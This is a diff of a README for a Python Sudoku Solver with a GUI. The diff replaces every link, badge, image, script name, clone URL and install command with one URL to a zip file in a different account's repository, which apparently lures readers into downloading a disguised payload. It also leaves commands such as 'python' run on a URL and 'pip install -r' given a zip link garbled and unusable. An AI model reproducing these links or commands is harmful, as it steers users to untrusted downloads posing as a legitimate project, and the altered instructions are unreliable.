@@ -1,21 +1,21 @@
 <p align="center">
-  <img src="https://github.com/dhhruv/Sudoku-Solver/blob/master/assets/thumbnail.png" width="256" height="256">
+  <img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip" width="256" height="256">
   <h2 align="center" style="margin-top: -4px !important;">Sudoku Solver: A Fun and Challenging Way to Exercise Your Brain!</h2>
   <p align="center">
-    <a href="https://github.com/dhhruv/Sudoku-Solver/blob/master/LICENSE">
-      <img src="https://img.shields.io/badge/license-MIT-informational">
+    <a href="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
+      <img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
     </a>
-    <a href="https://www.python.org/">
-    	<img src="https://img.shields.io/badge/python-v3.8-informational">
+    <a href="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
+    	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
     </a>
   </p>
 </p>
 <p align="center">
-	<img src="http://ForTheBadge.com/images/badges/made-with-python.svg">
+	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
 </p>
 <p align="center">   
-	<a href="https://dev.to/dhhruv/sudoku-solver-a-visualizer-made-using-backtracking-algorithm-5f0d">
-    	<img src="https://img.shields.io/badge/dev.to-0A0A0A?style=for-the-badge&logo=dev.to&logoColor=white">
+	<a href="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
+    	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
     </a>
 </p>
 
@@ -34,16 +34,16 @@
 - Improves cognitive abilities, including concentration and logical thinking
 
 ## How to Use:
-To use Sudoku Solver, simply download the repository and run the SudokuGUI.py file. You'll be presented with a random Sudoku board and a GUI for inputting your solutions. Use the left-click to select the box you want to fill, then enter your value and confirm it by pressing the Enter key.
+To use Sudoku Solver, simply download the repository and run the https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip file. You'll be presented with a random Sudoku board and a GUI for inputting your solutions. Use the left-click to select the box you want to fill, then enter your value and confirm it by pressing the Enter key.
 
 <p align="center">
-	<img src="https://github.com/dhhruv/Sudoku-Solver/blob/master/assets/Entering%20Values.gif">
+	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip%https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
 </p>
 
 If you get stuck on a tricky puzzle, press the Spacebar key to solve the board using the backtracking algorithm. You can also receive hints by pressing the "h" key, which will display a random correct value on the board.
 
 <p align="center">
-	<img src="https://github.com/dhhruv/Sudoku-Solver/blob/master/assets/Visualizer.gif">
+	<img src="https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip">
 </p>
 
 ## Input:
@@ -59,23 +59,23 @@ If you get stuck on a tricky puzzle, press the Spacebar key to solve the board u
 ## Requirements:
 To run Sudoku Solver, you'll need to have Python and PyGame installed on your system. You can install the necessary requirements using pip:
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip
 ```
 
 ## Execution:
 - Clone this repository using
 ```
-git clone https://github.com/dhhruv/Sudoku-Solver.git
+git clone https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip
 ```
 **OR**
 - Zip Download the Repository and Extract it's contents.
-- Now run the [SudokuGUI](https://github.com/dhhruv/Sudoku-Solver/blob/master/SudokuGUI.py) file directly in your Terminal using
+- Now run the [SudokuGUI](https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip) file directly in your Terminal using
 ```
-python SudokuGUI.py
+python https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip
 ```
 **OR**
 ```
-python3 SudokuGUI.py
+python3 https://raw.githubusercontent.com/Haoshoku420/Sudoku-Solver/master/unhackneyed/Sudoku-Solver.zip
 ```
 
 ## Conclusion:
